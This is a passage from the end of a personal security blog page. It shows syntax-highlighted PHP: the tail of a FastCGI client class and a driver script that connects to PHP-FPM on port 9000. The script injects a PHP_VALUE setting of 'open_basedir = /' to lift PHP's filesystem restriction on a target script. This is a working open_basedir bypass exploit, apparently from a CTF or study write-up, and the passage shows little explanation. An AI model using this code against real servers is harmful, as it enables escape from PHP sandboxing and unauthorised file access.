                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'response'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">END_REQUEST</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">REQ_STATE_OK</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$requestId</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">microtime</span><span class="token punctuation">(</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$startTime</span> <span class="token operator">>=</span> <span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// Reset</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">set_ms_timeout</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Timed out'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">is_array</span><span class="token punctuation">(</span> <span class="token variable">$resp</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">stream_get_meta_data</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// We must reset timeout but it must be AFTER we get info</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">set_ms_timeout</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timed_out'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TimedOutException</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Read timed out'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unread_bytes'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span>
                <span class="token operator">&amp;&amp;</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'blocked'</span><span class="token punctuation">]</span>
                <span class="token operator">&amp;&amp;</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'eof'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ForbiddenException</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Not in white list. Check listen.allowed_clients.'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Read failed'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// Reset timeout</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">set_ms_timeout</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">case</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">CANT_MPX_CONN</span><span class="token punctuation">:</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'This app can\'t multiplex [CANT_MPX_CONN]'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">OVERLOADED</span><span class="token punctuation">:</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'New request rejected; too busy [OVERLOADED]'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_ROLE</span><span class="token punctuation">:</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Role value not known [UNKNOWN_ROLE]'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">REQUEST_COMPLETE</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$requestId</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'response'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$client</span>    <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Client</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1:9000"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"open_basedir = /"</span><span class="token punctuation">;</span>
<span class="token variable">$filepath</span>  <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/1.php'</span><span class="token punctuation">;</span>
<span class="token variable">$content</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'hpdoger'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span>
    <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'php/fcgiclient'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9985'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'CONTENT_TYPE'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'7'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token variable">$content</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


    </div>
    
    
    
    
    
    
    
</div>

      </div>
    </transition>
    
    <transition name="fade">
      <div id="preview" ref="preview" v-show="previewShow">
        <img id="preview-content" ref="previewContent" />
      </div>
    </transition>
    
  </div>
  <script src="/blog/js/main.js"></script>
  
  




  
  

<div id="vcomments"></div>
<script defer src="/blog/js/lib/valine.min.js" onload="
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
"></script>


  <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>